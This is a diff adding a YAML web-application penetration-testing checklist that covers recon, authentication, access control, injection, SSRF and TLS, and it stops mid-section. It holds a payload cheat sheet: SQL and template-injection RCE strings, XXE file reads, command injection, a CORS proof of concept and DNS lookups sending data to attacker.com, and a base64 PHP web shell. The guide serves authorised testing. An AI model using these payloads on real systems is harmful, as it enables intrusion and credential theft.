@@ -1,0 +1,1880 @@
+name: "Web Application Testing"
+version: "1.1.0"
+author: "HackMind"
+description: >
+  Comprehensive web application penetration testing methodology.
+  Covers OWASP Top 10 (2021), recon, authentication, authorization, injection,
+  business logic, security headers, SSRF, common tech-stack misconfigurations,
+  and the most common bug bounty vulnerability classes.
+
+nodes:
+  # =========================================================================
+  # RECONNAISSANCE
+  # =========================================================================
+  - id: recon
+    type: info
+    title: "Reconnaissance"
+    content: "Passive and active information gathering before touching the application."
+    children:
+      - id: recon_scope
+        type: checklist
+        title: "Define scope and collect seed assets"
+        content: |
+          Before anything else, clearly define what is in scope.
+          - Read the program policy / rules of engagement
+          - List all in-scope domains, subdomains, IPs, and ASNs
+          - Note any explicitly out-of-scope assets (third-party, CDNs, etc.)
+          - Record the target organisation name and known ASNs:
+            whois <domain> | grep -i "org\|asn"
+            amass intel -org "Target Corp"
+
+      - id: recon_subdomain
+        type: checklist
+        title: "Subdomain Enumeration"
+        content: |
+          Passive (no direct contact):
+          - crt.sh / cert.sh: https://crt.sh/?q=%25.target.com
+          - subfinder -d target.com -all -recursive
+          - amass enum -passive -d target.com
+          - assetfinder --subs-only target.com
+          - GitHub, Shodan, VirusTotal, SecurityTrails, Chaos (chaos.projectdiscovery.io)
+
+          Active (DNS brute-force):
+          - puredns brute all.txt target.com -r resolvers.txt
+          - dnsx -l subdomains.txt -a -cname -resp
+
+          Post-enumeration:
+          - httpx -l subs.txt -title -status-code -tech-detect -ports 80,443,8080,8443
+          - Check for CNAME pointing to unclaimed services (subdomain takeover)
+          - Look for dev/staging/test subdomains with weaker controls
+
+      - id: recon_port_scan
+        type: checklist
+        title: "Port scanning and service discovery"
+        content: |
+          Full port scan all in-scope IPs:
+          - nmap -sV -sC -p- --min-rate 5000 -oA nmap_full <target>
+          - masscan -p1-65535 <CIDR> --rate=10000 (initial sweep)
+
+          Look for unexpected services:
+          - Dev/admin ports: 8080, 8443, 8888, 9000, 9090, 9200 (Elasticsearch)
+          - Database ports accidentally exposed: 3306, 5432, 6379, 27017
+          - Management interfaces: 22, 3389, 5900, 8161 (ActiveMQ), 7474 (Neo4j)
+          - Run nikto / nuclei on each open web port
+
+      - id: recon_google_dorks
+        type: checklist
+        title: "Google dorking and OSINT"
+        content: |
+          Use Google / Bing / DuckDuckGo with operators:
+          - site:target.com filetype:pdf OR filetype:xlsx OR filetype:docx
+          - site:target.com inurl:admin OR inurl:login OR inurl:dashboard
+          - site:target.com "index of /" OR "directory listing"
+          - site:target.com ext:sql OR ext:log OR ext:bak OR ext:env
+          - "target.com" "api_key" OR "secret" OR "password" site:github.com
+          - intitle:"500 Internal Server Error" site:target.com
+
+          Other OSINT:
+          - Shodan: hostname:target.com / org:"Target Corp"
+          - Censys: parsed.names: target.com
+          - FOFA / ZoomEye / Netlas for additional asset discovery
+          - https://leakix.net - data breach search
+
+      - id: recon_github
+        type: checklist
+        title: "GitHub / GitLab source code reconnaissance"
+        content: |
+          Search GitHub for leaked credentials and internal information:
+          Tools: trufflehog, gitleaks, gitrob, gh-dork
+
+          Manual searches:
+          - github.com/search?q="target.com"+password
+          - github.com/search?q="target.com"+api_key
+          - github.com/search?q="target.com"+secret
+          - github.com/search?q=target.com+filename:.env
+          - github.com/search?q=target.com+filename:config.yml
+
+          If source repo found:
+          - trufflehog git <repo_url> --only-verified
+          - gitleaks detect --source=<cloned_repo> -v
+          - Review commit history for credentials committed and removed
+          - Look for internal hostnames, endpoint paths, JWT secrets
+
+      - id: recon_wayback
+        type: checklist
+        title: "Historical URL and parameter analysis"
+        content: |
+          Mine archived versions for old endpoints, parameters, and JS:
+          - waybackurls target.com | tee wayback.txt
+          - gau target.com --mc 200 | tee gau.txt
+          - cat wayback.txt gau.txt | unfurl paths | sort -u
+
+          Look for:
+          - Old admin or debug endpoints still accessible
+          - Parameters that no longer appear in the current UI
+          - Old API versions (v1, v2) still alive
+          - Previously exposed files (backups, configs)
+
+          katana -u https://target.com -depth 5 -jc -kf all -d 5 -o katana.txt
+
+      - id: recon_tech_fingerprint
+        type: checklist
+        title: "Technology Fingerprinting"
+        content: |
+          Identify the full tech stack:
+          - whatweb -a 3 https://target.com
+          - Wappalyzer browser extension
+          - httpx -u https://target.com -tech-detect -title -status-code
+
+          HTTP headers to inspect:
+          - Server: nginx/1.18 → version disclosure
+          - X-Powered-By: PHP/7.4.3 → exact version
+          - X-Generator / X-Drupal-Cache → CMS disclosure
+          - Via / X-Cache / CF-Cache-Status → CDN/proxy detection
+          - Set-Cookie name patterns: PHPSESSID, JSESSIONID, ASP.NET_SessionId
+
+          Identify WAF:
+          - wafw00f https://target.com
+          - nmap --script http-waf-detect -p 443 target.com
+          - Look for Cloudflare (CF-RAY), Akamai, Imperva, AWS WAF response patterns
+
+      - id: recon_content_discovery
+        type: checklist
+        title: "Content & directory discovery"
+        content: |
+          Enumerate paths, files, and hidden endpoints:
+          - ffuf -u https://target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -mc 200,201,204,301,302,403 -o ffuf.json
+          - feroxbuster -u https://target.com -w /opt/SecLists/Discovery/Web-Content/common.txt --depth 3 --auto-tune
+
+          High-value targets:
+          - /.git/HEAD, /.git/config, /.svn/entries
+          - /.env, /.env.local, /.env.production
+          - /robots.txt, /sitemap.xml, /crossdomain.xml, /clientaccesspolicy.xml
+          - /.well-known/security.txt
+          - /backup/, /old/, /temp/, /test/, /dev/
+          - /phpinfo.php, /info.php, /test.php
+          - /server-status, /server-info (Apache)
+          - /actuator, /actuator/env, /actuator/heapdump (Spring Boot)
+          - /api, /api/v1, /api/v2, /swagger-ui, /openapi.json, /graphql
+
+          File extension bruteforce on discovered paths:
+          ffuf -u https://target.com/indexFUZZ -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt
+
+      - id: recon_js_analysis
+        type: checklist
+        title: "JavaScript and API endpoint analysis"
+        content: |
+          Extract all JS files and analyse them:
+          - katana / gau / waybackurls → collect all .js URLs
+          - curl each JS file, grep for API endpoints:
+            grep -oP '(https?://[^\s"'"'"']+|/api/[^\s"'"'"']+)' bundle.js
+
+          Tools:
+          - LinkFinder: python3 linkfinder.py -i https://target.com -d
+          - SecretFinder: python3 SecretFinder.py -i app.min.js -o cli
+          - trufflehog filesystem --directory ./js_files
+
+          Look for:
+          - API keys, tokens, credentials (grep for: apiKey, secret, password, token, key:, authorization:)
+          - Internal hostnames / staging URLs
+          - Hidden admin endpoints or feature flags
+          - Source map files (*.js.map) — may expose original source
+          - GraphQL schema introspection hints
+
+      - id: recon_cloud
+        type: checklist
+        title: "Cloud asset discovery"
+        content: |
+          Find misconfigured cloud storage and services:
+
+          S3 bucket enumeration:
+          - s3scanner scan --buckets-file buckets.txt
+          - Guess common bucket names: target-com-assets, target-backup, target-dev
+          - awscli: aws s3 ls s3://<bucket-name> --no-sign-request
+
+          Azure Blob / GCP Storage:
+          - GCPBucketBrute: python3 GCPBucketBrute.py --keyword target
+          - https://target.blob.core.windows.net/<container>?restype=container&comp=list
+
+          Check DNS:
+          - Any CNAME to *.s3.amazonaws.com, *.blob.core.windows.net, *.storage.googleapis.com
+          - nslookup subdomains for cloud indicators
+
+          Firebase / Amplify:
+          - https://target-default-rtdb.firebaseio.com/.json (unauthenticated read)
+          - Check for exposed Firebase rules
+
+  # =========================================================================
+  # OWASP A07 — AUTHENTICATION FAILURES
+  # =========================================================================
+  - id: q_auth
+    type: question
+    title: "Does the target have authentication?"
+    options:
+      - label: "Yes"
+        key: "yes"
+        children:
+          - id: q_auth_type
+            type: question
+            title: "What authentication mechanism is used?"
+            options:
+              - label: "Homegrown (custom login form)"
+                key: "homegrown"
+                children:
+                  - id: auth_homegrown_sqli
+                    type: checklist
+                    title: "Test login for SQL injection"
+                    content: |
+                      ' OR '1'='1, admin'-- , ' OR 1=1-- -
+                      Use sqlmap: sqlmap -r login_request.txt --level=3 --risk=2
+                      Check for blind SQLi via timing: ' OR SLEEP(5)--
+
+                  - id: auth_homegrown_default_creds
+                    type: checklist
+                    title: "Test for default / weak credentials"
+                    content: |
+                      Common defaults: admin:admin, admin:password, admin:123456, root:root
+                      test:test, guest:guest, admin:(blank), administrator:administrator
+                      Check vendor documentation for product-specific defaults.
+                      Hydra: hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+
+              - label: "JWT"
+                key: "jwt"
+                children:
+                  - id: auth_jwt_alg_none
+                    type: checklist
+                    title: "Test JWT algorithm confusion"
+                    content: |
+                      Algorithm none attack:
+                      - Decode the JWT header, change "alg" to "none", remove signature
+                      - jwt_tool.py <token> -X a
+
+                      RS256 → HS256 confusion:
+                      - If server uses RS256, try signing with HS256 using the public key as secret
+                      - jwt_tool.py <token> -X k -pk public.pem
+
+                      Weak secret brute-force:
+                      - hashcat -a 0 -m 16500 <jwt> /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+                      - jwt_tool.py <token> -C -d wordlist.txt
+
+                  - id: auth_jwt_claims
+                    type: checklist
+                    title: "Test JWT claim manipulation"
+                    content: |
+                      - Decode and inspect all claims (sub, role, admin, exp, iss, aud)
+                      - Change "role": "user" to "role": "admin", re-sign if secret known
+                      - Check if exp is validated — set far future expiry
+                      - Check if iss / aud are validated
+                      - Try sending JWTs to other endpoints of the same service (cross-service reuse)
+                      - jku / x5u header injection: point to attacker-hosted JWK Set
+
+              - label: "Keycloak"
+                key: "keycloak"
+                children:
+                  - id: auth_keycloak_cves
+                    type: checklist
+                    title: "Check for known Keycloak CVEs"
+                    content: |
+                      Identify version via /auth/realms/master/.well-known/openid-configuration
+                      Notable CVEs:
+                      - CVE-2023-6927 (open redirect)
+                      - CVE-2024-1132 (path traversal in redirect_uri)
+                      - CVE-2023-0264 (user enumeration via login form)
+                      - CVE-2022-4361 (XSS)
+                      Search NVD: https://nvd.nist.gov/vuln/search?query=keycloak
+
+                  - id: auth_keycloak_misconfig
+                    type: checklist
+                    title: "Check Keycloak misconfiguration"
+                    content: |
+                      - Is /auth/admin/ accessible from the internet? (default admin console)
+                      - Are any realms configured with weak client secrets?
+                      - Is implicit flow enabled? (deprecated, leaks tokens in URL)
+                      - Is direct grant (password grant) enabled unnecessarily?
+                      - Are token lifetimes unreasonably long (>1 hour for access tokens)?
+                      - Is master realm used by the application (should use a dedicated realm)?
+
+              - label: "Authelia"
+                key: "authelia"
+                children:
+                  - id: auth_authelia_bypass
+                    type: checklist
+                    title: "Test Authelia authentication bypass"
+                    content: |
+                      - Can backend services be reached by routing around the Authelia proxy?
+                        Test direct IP / port access to upstream services
+                      - Test access_control rules for gaps: missing paths, wrong prefixes
+                      - Verify session cookies: Secure, HttpOnly, SameSite flags
+                      - Test subdomain that shares session cookie domain
+                      - Check for X-Forwarded-For / X-Remote-User / X-Auth-Request-User headers
+                        being trusted from client
+
+              - label: "OAuth2 / OIDC"
+                key: "oauth2"
+                children:
+                  - id: auth_oauth_state
+                    type: checklist
+                    title: "Test OAuth state parameter (CSRF)"
+                    content: |
+                      - Is state parameter present in authorization request?
+                      - Is it cryptographically random (not guessable/predictable)?
+                      - Is it validated server-side on the callback?
+                      - Try replaying an old state value
+                      - Try omitting the state parameter entirely
+                      Missing/static state = CSRF against the OAuth flow → account takeover
+
+                  - id: auth_oauth_redirect
+                    type: checklist
+                    title: "Test redirect_uri validation"
+                    content: |
+                      Manipulate redirect_uri in the authorization request:
+                      - Add a path: https://legit.com/callback/../../../attacker.com
+                      - Add a parameter: https://legit.com/callback?next=https://attacker.com
+                      - Use a different subdomain: https://sub.target.com/callback (if registered at domain level)
+                      - Try open redirect chaining from the registered redirect_uri
+                      - Test regex bypass: https://legit.com.attacker.com/callback
+
+                  - id: auth_oauth_token_leak
+                    type: checklist
+                    title: "Test for token leakage and code reuse"
+                    content: |
+                      - Is the auth code sent in URL? Check Referer headers and server logs
+                      - Is the access token in URL fragments? (implicit flow)
+                      - Try reusing an auth code after it's been exchanged (should fail)
+                      - Check if refresh tokens are properly rotated on use
+                      - Is PKCE enforced for public clients?
+
+              - label: "SAML"
+                key: "saml"
+                children:
+                  - id: auth_saml_signature
+                    type: checklist
+                    title: "Test SAML signature validation"
+                    content: |
+                      XML Signature Wrapping (XSW) attacks:
+                      - Add a second unsigned assertion alongside the signed one
+                      - Move the signed assertion into an extension element, replace the original
+                      - Tools: SAMLRaider (Burp extension), saml-raider
+                      - Remove the signature entirely — does the IDP still accept it?
+                      - Try changing NameID / attributes after signature is generated
+
+                  - id: auth_saml_xxe
+                    type: checklist
+                    title: "Test XXE in SAML assertions"
+                    content: |
+                      Inject XXE entities in the SAMLResponse (base64-decoded):
+                      <?xml version="1.0"?>
+                      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+                      Re-encode and send. If reflected, XXE is present.
+                      Also test blind XXE with out-of-band callback (Burp Collaborator).
+
+          - id: auth_common
+            type: info
+            title: "Common Authentication Tests"
+            content: "These apply regardless of the auth mechanism in use."
+            children:
+              - id: auth_protection_check
+                type: checklist
+                title: "Assess authentication protection mechanisms"
+                content: |
+                  Document what defences are in place — needed regardless of scope:
+                  - Is there rate limiting on login attempts? How many before triggering?
+                  - Is there account lockout? How many attempts? Temporary or permanent?
+                  - Is CAPTCHA present on the login form?
+                  - Does the app disclose whether an account exists via different error messages?
+
+              - id: auth_bruteforce
+                type: checklist
+                title: "Test brute-force and lockout bypass"
+                scope_tags: [brute_force]
+                content: |
+                  Attempt to bypass the rate limiting and lockout controls identified above:
+                  - Rotate source IPs via X-Forwarded-For / X-Real-IP / True-Client-IP
+                  - Add X-Originating-IP, Forwarded: headers to appear as a new client
+                  - Pad username with spaces ("admin ") to defeat per-account counters
+                  - Use case variations ("Admin", "ADMIN") against case-insensitive stores
+                  - CAPTCHA bypass: reuse a solved token, use audio CAPTCHA, or OCR tools
+
+              - id: auth_username_enum
+                type: checklist
+                title: "Test username enumeration"
+                content: |
+                  Compare valid vs invalid usernames across:
+                  - Response body text ("User not found" vs "Incorrect password")
+                  - HTTP status codes (200 vs 401)
+                  - Response time (database lookup timing)
+                  - Registration: "that email is already registered"
+                  - Password reset: "we sent an email" vs "no account found"
+                  - Username enumeration + password spray = low-and-slow brute force
+
+              - id: auth_password_reset
+                type: checklist
+                title: "Test password reset flow"
+                content: |
+                  - Is the reset token long, random, and single-use?
+                  - Does it expire quickly (< 15 min recommended)?
+                  - Can a reset token be reused after the password was changed?
+                  - Is the old password invalidated immediately on reset?
+                  - Host header injection: send reset with Host: attacker.com
+                    → does the email link point to attacker.com?
+                  - Test parameter pollution: email=victim@target.com&email=attacker@evil.com
+                  - Test if token is predictable (timestamp-based, sequential)
+                  - Can you reset someone else's account by manipulating the reset request?
+
+              - id: auth_mfa
+                type: checklist
+                title: "Test multi-factor authentication"
+                content: |
+                  - Can MFA be bypassed by skipping directly to post-MFA endpoints?
+                  - Is the MFA code rate-limited? Brute-force 6-digit OTP if not
+                  - Can a used OTP code be replayed (should be invalidated immediately)?
+                  - Is MFA enforced on all sensitive actions (not just login)?
+                  - Test account recovery / backup codes:
+                    - Are backup codes single-use and revoked once used?
+                    - Can they be brute-forced?
+                  - Does the application expose a pre-2FA session that has partial access?
+                  - Test SIM-swap / SMS interception risk (document if SMS-based)
+
+              - id: auth_session_management
+                type: info
+                title: "Session Management"
+                content: "How sessions are created, maintained, and destroyed."
+                children:
+                  - id: auth_session_flags
+                    type: checklist
+                    title: "Check session cookie flags"
+                    content: |
+                      Every session cookie must have:
+                      - Secure — only sent over HTTPS
+                      - HttpOnly — not accessible via JavaScript
+                      - SameSite=Strict or Lax — CSRF protection
+                      Check in browser DevTools → Application → Cookies
+                      or: curl -s -I https://target.com/login | grep -i set-cookie
+
+                  - id: auth_session_fixation
+                    type: checklist
+                    title: "Test session fixation"
+                    content: |
+                      1. Obtain a session token without authenticating (GET /login)
+                      2. Authenticate using that session token
+                      3. Check if the session ID changes post-authentication
+                      If the pre-auth session ID is still valid post-login → session fixation.
+
+                  - id: auth_session_timeout
+                    type: checklist
+                    title: "Test session timeout and logout"
+                    content: |
+                      - Is there an idle session timeout?
+                      - Is there an absolute maximum session lifetime?
+                      - After logout, is the server-side session invalidated?
+                        (Test: copy session cookie before logout, attempt to use it after)
+                      - Is there a "remember me" token? Is it revocable server-side?
+                      - Are all sessions terminated when the user changes their password?
+
+      - label: "No"
+        key: "no"
+        children: []
+
+  # =========================================================================
+  # OWASP A01 — BROKEN ACCESS CONTROL
+  # =========================================================================
+  - id: authz
+    type: info
+    title: "Authorization & Access Control (OWASP A01)"
+    content: "Test whether access controls are consistently enforced server-side."
+    children:
+      - id: authz_idor
+        type: checklist
+        title: "IDOR — Insecure Direct Object Reference"
+        content: |
+          This is the #1 bug bounty finding. Test every object reference.
+
+          Find: IDs, GUIDs, usernames, email addresses, filenames in:
+          - URL paths: /users/1234/profile
+          - Query parameters: ?account_id=1234
+          - POST/PUT body: {"user_id": 1234}
+          - Headers: X-User-ID, X-Account
+          - Cookies
+
+          Test methodology:
+          1. Create two test accounts (A and B)
+          2. As A, perform actions and capture all object references
+          3. As B, replay requests with A's object IDs
+          4. Check: read, write, delete, update operations separately
+
+          Common high-impact IDOR targets:
+          - /api/users/{id}/export, /api/invoices/{id}, /api/orders/{id}
+          - Password/email change endpoints with userId in body
+          - File download endpoints
+          - Admin actions that accept a userId parameter
+
+      - id: authz_privilege_escalation
+        type: checklist
+        title: "Vertical privilege escalation"
+        content: |
+          - Map all role-specific functionality (admin panel, reporting, config)
+          - As a low-privilege user, attempt to call privileged endpoints directly
+          - Look for role / privilege / isAdmin parameters in requests — tamper them
+          - Test if simply possessing a higher-role JWT claim grants access
+          - Check if admin UI requests are purely client-side gated
+            (request still reaches the server — does the server enforce the role?)
+          - Test HTTP method differences: GET /admin/user may be allowed but PATCH is not
+          - Check GraphQL: is admin-only data exposed in the schema without access checks?
+
+      - id: authz_forced_browsing
+        type: checklist
+        title: "Forced browsing and missing function-level access control"
+        content: |
+          - Attempt to access restricted URLs directly (skip auth flows)
+          - Map the app as an admin, then replay all requests as a regular user
+          - Test: /admin, /admin/users, /admin/settings, /admin/export
+          - Try accessing next steps in multi-step workflows out of order
+          - Test if the app relies on URL obscurity rather than access checks
+          - Check if removing auth cookies still allows access to "protected" pages
+            (missing middleware, route exemptions)
+
+      - id: authz_cors
+        type: checklist
+        title: "CORS misconfiguration"
+        content: |
+          Check the Access-Control-Allow-Origin response header:
+
+          Reflected origin (critical):
+          - Send: Origin: https://attacker.com
+          - If response has: Access-Control-Allow-Origin: https://attacker.com
+            AND Access-Control-Allow-Credentials: true → full account takeover possible
+
+          Null origin:
+          - Send: Origin: null
+          - If ACAO: null + credentials allowed → exploit via sandboxed iframe
+
+          Subdomain trust:
+          - Try: Origin: https://sub.target.com or Origin: https://attacker.target.com.evil.com
+          - Regex bypass: Origin: https://attacker.comtarget.com
+
+          PoC skeleton:
+          fetch("https://target.com/api/me", {credentials: "include"})
+            .then(r => r.text()).then(d => location="https://attacker.com/?d="+btoa(d))
+
+  # =========================================================================
+  # OWASP A03 — INJECTION
+  # =========================================================================
+  - id: injection
+    type: info
+    title: "Injection (OWASP A03)"
+    content: "Test all user-controllable input for injection into interpreters."
+    children:
+      - id: injection_xss
+        type: checklist
+        title: "Cross-Site Scripting (XSS)"
+        content: |
+          Test all inputs: form fields, URL params, path segments, headers, cookies.
+
+          Reflected XSS:
+          - <script>alert(document.domain)</script>
+          - <img src=x onerror=alert(1)>
+          - "><svg onload=alert(1)>
+          - javascript:alert(1) in href/src attributes
+
+          Stored XSS (high impact):
+          - Profile fields, comments, messages, file names, custom labels
+          - Admin-visible content submitted by users is especially valuable
+
+          DOM XSS — check JS sinks:
+          - document.write(), innerHTML, outerHTML, insertAdjacentHTML
+          - location.href, eval(), setTimeout/setInterval with string
+          - jQuery: .html(), .append() with unsanitized input
+          - Grep JS for: location.hash, document.referrer, location.search
+          Tools: DalFox, XSStrike, kxss
+
+          Blind XSS (fires in admin panel / backend):
+          - Set up XSS Hunter (xsshunter.trufflesecurity.com)
+          - Inject payload in every input that might reach an internal user
+          - Log user-agent, form fields, feedback forms, ticket systems
+
+      - id: injection_sqli
+        type: checklist
+        title: "SQL Injection"
+        content: |
+          Test every parameter that may feed a database query.
+
+          Detection:
+          - Single quote: ' → does it cause a 500 / error?
+          - Boolean: ' AND 1=1-- - vs ' AND 1=2-- - (different response?)
+          - Time-based (blind): ' AND SLEEP(5)-- - (MySQL) / ' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- - (Postgres)
+
+          Manual exploitation:
+          - Union: ' UNION SELECT NULL,NULL,NULL-- -  (adjust columns until no error)
+          - Error-based: ' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+
+          Automation:
+          - sqlmap -r request.txt --level=3 --risk=2 --dbs
+          - sqlmap -u "https://target.com/page?id=1" --batch --crawl=2
+
+          NoSQL injection (MongoDB):
+          - {"username": {"$ne": null}, "password": {"$ne": null}}
+          - username[$ne]=x&password[$ne]=y (URL-encoded form)
+          - {"$where": "sleep(5000)"}
+
+      - id: injection_ssti
+        type: checklist
+        title: "Server-Side Template Injection (SSTI)"
+        content: |
+          Test anywhere user input is reflected in the response.
+
+          Detection probes (trigger math evaluation):
+          - {{7*7}} → 49 (Jinja2/Twig)
+          - ${7*7} → 49 (FreeMarker, Thymeleaf, Spring EL)
+          - #{7*7} → 49 (Ruby ERB)
+          - <%= 7*7 %> → 49 (EJS, ERB)
+          - {{7*'7'}} → 7777777 (Jinja2 distinguishes from Twig)
+
+          Exploitation (RCE):
+          Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+          FreeMarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+          Tool: tplmap -u "https://target.com/page?name=*" --os-shell
+
+      - id: injection_xxe
+        type: checklist
+        title: "XML External Entity Injection (XXE)"
+        content: |
+          Anywhere XML is parsed: file uploads, SOAP APIs, SAML, RSS, XML-RPC.
+
+          Classic XXE (file read):
+          <?xml version="1.0"?>
+          <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+          <root><data>&xxe;</data></root>
+
+          SSRF via XXE:
+          <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+
+          Blind XXE (out-of-band):
+          <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://burpcollaborator.net/xxe"> %xxe;]>
+
+          Error-based blind:
+          <!ENTITY % file SYSTEM "file:///etc/passwd">
+          <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://burpcollaborator.net/?x=%file;'>">
+          %eval; %exfil;
+
+          Also test: SVG uploads, DOCX/XLSX file processing, XLSX imports.
+
+      - id: injection_cmd
+        type: checklist
+        title: "OS Command Injection"
+        content: |
+          Test inputs that may reach a shell: ping targets, DNS lookups, file converters,
+          PDF generators, image processors, nslookup, traceroute, whois features.
+
+          Linux payloads:
+          - ; whoami
+          - | whoami
+          - && whoami
+          - `whoami`
+          - $(whoami)
+          - \nwhoami
+
+          Windows:
+          - & whoami
+          - | whoami
+          - cmd /c whoami
+
+          Blind detection:
+          - ; sleep 10 / | ping -c 5 127.0.0.1 (time delay)
+          - Out-of-band: ; nslookup `whoami`.attacker.com
+          - Burp Collaborator payloads for DNS exfiltration
+
+          Tool: commix --url="https://target.com/page?ip=INJECT_HERE"
+
+      - id: injection_path_traversal
+        type: checklist
+        title: "Path Traversal / LFI / RFI"
+        content: |
+          Anywhere the app reads a file based on user input:
+          ?file=report.pdf, ?page=home, ?template=default
+
+          Basic payloads:
+          - ../../../etc/passwd
+          - ....//....//....//etc/passwd
+          - ..%2F..%2F..%2Fetc%2Fpasswd
+          - ..%252F..%252Fetc%252Fpasswd (double URL encoding)
+          - /etc/passwd%00 (null byte — legacy PHP)
+
+          Windows targets:
+          - ..\..\..\..\Windows\System32\drivers\etc\hosts
+          - ..%5C..%5C..%5CWindows%5Cwiin.ini
+
+          PHP LFI wrappers:
+          - ?page=php://filter/convert.base64-encode/resource=index.php
+          - ?page=php://input (POST body as PHP code)
+          - ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
+          - Log poisoning: poison /var/log/apache2/access.log via User-Agent, then include it
+
+      - id: injection_ldap
+        type: checklist
+        title: "LDAP Injection"
+        content: |
+          Test authentication or search forms backed by LDAP/Active Directory.
+
+          Authentication bypass:
+          - username: *)(uid=*))(|(uid=*  password: anything
+          - username: admin)(&)   (inject false condition)
+
+          Search injection:
+          - )(cn=*)  in search fields
+          - *)(objectClass=*  to enumerate all objects
+
+          Blind LDAP injection:
+          - admin)(|(password=a*  → time/response difference reveals attribute values
+
+      - id: injection_csrf
+        type: checklist
+        title: "Cross-Site Request Forgery (CSRF)"
+        content: |
+          Test all state-changing requests for CSRF protection.
+
+          Is a CSRF token present?
+          - In a hidden form field
+          - In a custom header (X-CSRF-Token, X-Requested-With)
+
+          Is the token validated?
+          - Remove the token entirely — does the request succeed?
+          - Use an empty token / arbitrary value
+          - Use another user's valid token (should be user-specific)
+          - Reuse the same token for multiple requests
+
+          SameSite cookie bypass scenarios:
+          - Is SameSite=None with Secure set? (allows cross-site)
+          - Top-level navigation bypass (SameSite=Lax): GET requests that change state
+
+          JSON CSRF (no CSRF token):
+          - Can the Content-Type be changed to text/plain while keeping JSON body?
+          - Flash-based request (legacy)
+
+  # =========================================================================
+  # OWASP A10 — SERVER-SIDE REQUEST FORGERY (SSRF)
+  # =========================================================================
+  - id: ssrf
+    type: info
+    title: "Server-Side Request Forgery — SSRF (OWASP A10)"
+    content: "Force the server to make outbound requests to internal or external resources."
+    children:
+      - id: ssrf_identify
+        type: checklist
+        title: "Identify SSRF attack surface"
+        content: |
+          Anywhere the server fetches a URL or resource from user input:
+          - URL parameters: ?url=, ?uri=, ?link=, ?src=, ?path=, ?feed=, ?redirect=
+          - Webhooks / callback URLs
+          - PDF / screenshot generators (pass URL or HTML)
+          - Image / file import from URL
+          - API integrations that fetch remote resources
+          - XML parsing (XXE → SSRF, see injection section)
+          - PDF export features with HTML rendering
+
+      - id: ssrf_basic
+        type: checklist
+        title: "Basic SSRF — internal network access"
+        content: |
+          Probe internal infrastructure:
+          - http://localhost/ → is the response different from a non-existent host?
+          - http://127.0.0.1/
+          - http://0.0.0.0/
+          - http://[::1]/
+          - http://0/
+          - http://internal-host/
+          - http://192.168.0.1/ (common router/gateway)
+          - http://10.0.0.1/, http://172.16.0.1/ (private ranges)
+
+          Port scanning via SSRF:
+          - Enumerate common internal ports: 22, 80, 443, 8080, 3306, 5432, 6379, 27017
+          - Time differences indicate open vs closed ports
+
+      - id: ssrf_cloud_imds
+        type: checklist
+        title: "SSRF — cloud metadata service (IMDS)"
+        content: |
+          AWS EC2 metadata (critical — leads to IAM credential theft):
+          - http://169.254.169.254/latest/meta-data/
+          - http://169.254.169.254/latest/meta-data/iam/security-credentials/
+          - http://169.254.169.254/latest/user-data/ (may contain secrets)
+          - IMDSv2 bypass: check if a PUT to get a token is required
+
+          GCP metadata:
+          - http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+          Header required: Metadata-Flavor: Google
+
+          Azure IMDS:
+          - http://169.254.169.254/metadata/instance?api-version=2021-02-01
+          Header required: Metadata: true
+
+          Alternative IPs for SSRF filter bypass:
+          - http://169.254.169.254 decimal: http://2852039166
+          - URL redirect: http://attacker.com/redirect → 169.254.169.254
+
+      - id: ssrf_bypass
+        type: checklist
+        title: "SSRF filter bypass techniques"
+        content: |
+          If basic SSRF is blocked, try:
+          - Decimal IP: http://2130706433/ = http://127.0.0.1/
+          - Octal IP: http://0177.0.0.1/
+          - IPv6: http://[::1]/, http://[::ffff:127.0.0.1]/
+          - URL scheme variations: dict://, sftp://, gopher://, file:///
+          - DNS rebinding: use rebinding service to point to 127.0.0.1 on second resolve
+          - Open redirect chain: ?url=https://legit.com/redirect?to=http://169.254.169.254
+          - URL parser inconsistency: http://attacker.com@169.254.169.254/
+          - Short URLs that resolve to internal IPs
+          - http://localtest.me/ (DNS resolves to 127.0.0.1)
+
+  # =========================================================================
+  # OWASP A02 — CRYPTOGRAPHIC FAILURES
+  # =========================================================================
+  - id: crypto
+    type: info
+    title: "Cryptographic Failures (OWASP A02)"
+    content: "Weak or absent cryptography exposing sensitive data in transit or at rest."
+    children:
+      - id: crypto_tls
+        type: checklist
+        title: "TLS / SSL configuration"
+        content: |
+          testssl.sh https://target.com
+          sslyze --regular target.com
+          Qualys SSL Labs: https://www.ssllabs.com/ssltest/
+
+          Check for:
+          - SSLv3, TLS 1.0, TLS 1.1 (deprecated, should be TLS 1.2+ only)
+          - Weak cipher suites: RC4, DES, 3DES, NULL, EXPORT, anon-DH
+          - Missing Forward Secrecy (ECDHE / DHE key exchange)
+          - Expired or self-signed certificates
+          - Certificate not matching the hostname
+          - BEAST, POODLE, DROWN, LUCKY13, ROBOT vulnerability
+          - HSTS header missing or max-age too short
+
+      - id: crypto_sensitive_data
+        type: checklist
+        title: "Sensitive data in transit and at rest"
+        content: |
+          - Sensitive data sent over HTTP (not HTTPS)
+          - Mixed content: HTTPS page loading HTTP resources
+          - Sensitive data in URL query parameters (appears in server logs, Referer headers):
+            passwords, tokens, SSNs, API keys
+          - Passwords stored in plaintext or with weak hashing (MD5, SHA1 without salt)
+          - PII or financial data in API responses that isn't needed by the client
+          - Autocomplete=on on password / sensitive fields (minor, but reportable)
+          - Sensitive data cached in browser (Cache-Control missing)
+
+      - id: crypto_headers_sensitive
+        type: checklist
+        title: "Check for information disclosure in responses"
+        content: |
+          - Server headers revealing exact version: Server: Apache/2.4.41 (Ubuntu)
+          - X-Powered-By: PHP/7.4.3
